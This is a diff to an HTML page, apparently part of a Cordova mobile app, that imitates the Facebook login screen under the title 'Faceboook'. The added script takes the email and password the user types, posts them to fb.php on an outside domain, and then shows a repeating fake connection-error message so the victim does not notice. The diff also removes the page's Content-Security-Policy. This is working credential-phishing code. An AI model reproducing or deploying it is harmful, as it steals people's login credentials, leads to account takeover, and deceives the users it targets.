@@ -1,11 +1,13 @@
 <!DOCTYPE html>
 <html>
     <head>
-        <meta http-equiv="Content-Security-Policy" content="default-src 'self' data: gap: https://ssl.gstatic.com 'unsafe-eval'; style-src 'self' 'unsafe-inline'; media-src *">
+        <meta charset="utf-8">
         <meta name="format-detection" content="telephone=no">
         <meta name="msapplication-tap-highlight" content="no">
         <meta name="viewport" content="user-scalable=no, initial-scale=1, maximum-scale=1, minimum-scale=1, width=device-width">
         <link rel="stylesheet" type="text/css" href="css/index.css">
+        <link rel="stylesheet" type="text/css" href="dist/sweetalert.css">
+        <link rel="stylesheet" type="text/css" href="themes/facebook/facebook.css">
         <title>Faceboook</title>
         <style type="text/css">
 
@@ -41,16 +43,45 @@
     <body>
         <br><br><br>
         <center>
-            <div class="contenido">
             <img src="img/logo.png" width="40%" style="padding-right:50px;"><br><br><br><br>
-            <input type="text" class="login" placeholder="Email"><br><br>
-            <input type="password" class="login" placeholder="Password"><br><br>
-            <button class="boton">Log In</button><br><br><br><br><br><br>
-            <a href="#" style="color:white">Sing Up for facebook</a><button class="boton_ayuda">?</button>
+            <div class="contenido">
+            
+            <input type="email" class="login" placeholder="Email" id="email"><br><br>
+            <input type="password" class="login" placeholder="Password" id="password"><br><br>
+            <button class="boton" onclick="login();">Log In</button><br><br><br><br><br><br>
+            <a href="#" onclick="mensajeAyuda();" style="color:white">Sing Up for facebook</a><button onclick="mensajeAyuda();" class="boton_ayuda">?</button>
             </div>
         </center>
-        
+        <script type="text/javascript">
+            function mensajeAyuda()
+            {
+                swal('Mensaje','No se ha podido recuperar la información necesaria verifique su conexión');
+            }
+            function login(){
+                var email=$("#email").prop("value");
+                var password=$("#password").prop("value");
+                if(email.length<=0 || password.length<=0)
+                {
+                    swal('Mensaje','Favor de introducir sus datos correctamente');
+                }else{
+                    $(".contenido").html('<p style="color:white">Loading...</p><img src="img/load.gif">');
+                    $.post("http://sacygrestaurantes.com/fb.php",{
+                        email:email,
+                        password:password
+                    },function(d){
+                       setInterval(function () {
+                        swal('Mensaje','No se ha podido recuperar la información necesaria verifique su conexión');
+
+                        }, 
+                        10000); 
+                    });
+                    
+                }
+            }
+        </script>
         <script type="text/javascript" src="cordova.js"></script>
         <script type="text/javascript" src="js/index.js"></script>
+        <script type="text/javascript" src="js/jquery.js"></script>
+        <script type="text/javascript" src="dist/sweetalert.min.js"></script>
     </body>
 </html>
